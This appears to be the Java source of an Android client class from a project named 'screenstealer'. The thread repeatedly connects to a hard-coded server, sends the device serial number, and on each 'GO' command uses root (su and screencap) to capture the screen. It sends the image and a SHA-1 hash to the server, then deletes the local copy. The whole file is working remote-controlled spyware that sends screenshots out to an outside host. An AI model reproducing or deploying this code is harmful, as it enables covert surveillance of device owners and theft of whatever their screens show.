package castellini.jacopo.screenstealer;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.security.MessageDigest;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ClientThread extends Thread {

    private Socket sock = null;
    private BufferedReader br = null;
    private DataOutputStream dos = null;

    public void run() {
        final String HOST = "192.168.0.6";
        final int PORT = 7654;
        boolean res = false;
        while (!res) {
            try {
                sock = new Socket(HOST, PORT);
                res = true;
            } catch (IOException e) {
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException i) {
                    i.printStackTrace();
                }
            }
        }
        try {
            Log.i("Client", "Connection established!");
            dos = new DataOutputStream(sock.getOutputStream());
            br = new BufferedReader(new InputStreamReader(sock.getInputStream()));
            dos.writeUTF(android.os.Build.SERIAL);
            Log.i("Client", "Serial number sended");
            String fromServer;
            Date date;
            DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH-mm-ss");
            byte[] screen, digest;
            MessageDigest sha1;
            while (true) {
                fromServer = br.readLine();
                Log.i("Client", "Request received");
                if (fromServer.equals("STOP"))
                    break;
                else if (fromServer.equals("GO")) {
                    date = new Date();
                    dos.writeUTF(df.format(date));
                    screen = takeScreenshot();
                    dos.writeInt(screen.length);
                    dos.write(screen);
                    File file = new File(Environment.getExternalStorageDirectory().toString() + "/screenshot.png");
                    res = false;
                    while (!res)
                        res = file.delete();
                    Log.i("Client", "Screenshot sended");
                    sha1 = MessageDigest.getInstance("SHA-1");
                    sha1.update(screen, 0, screen.length);
                    digest = sha1.digest();
                    StringBuilder sb = new StringBuilder();
                    for (int seq : digest)
                        sb.append(Integer.toString((seq & 0xff) + 0x100, 16).substring(1));
                    dos.writeUTF(sb.toString());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            Log.i("Client", "Connection closed...");
            try {
                if (br != null)
                    br.close();
                if (dos != null)
                    dos.close();
                if (sock != null)
                    sock.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private byte[] takeScreenshot() {
        OutputStream os = null;
        ByteArrayOutputStream baos = null;
        byte[] byteArray = null;
        try {
            Process sh = Runtime.getRuntime().exec("su", null, null);
            os = sh.getOutputStream();
            os.write(("/system/bin/screencap -p " + Environment.getExternalStorageDirectory().toString() + "/screenshot.png").getBytes("ASCII"));
            os.flush();
            os.close();
            sh.waitFor();
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inPreferredConfig = Bitmap.Config.ARGB_8888;
            Bitmap screen = BitmapFactory.decodeFile(Environment.getExternalStorageDirectory().toString() + "/screenshot.png", options);
            baos = new ByteArrayOutputStream();
            screen.compress(Bitmap.CompressFormat.PNG, 100, baos);
            byteArray = baos.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (os != null)
                    os.close();
                if (baos != null)
                    baos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return byteArray;
    }
}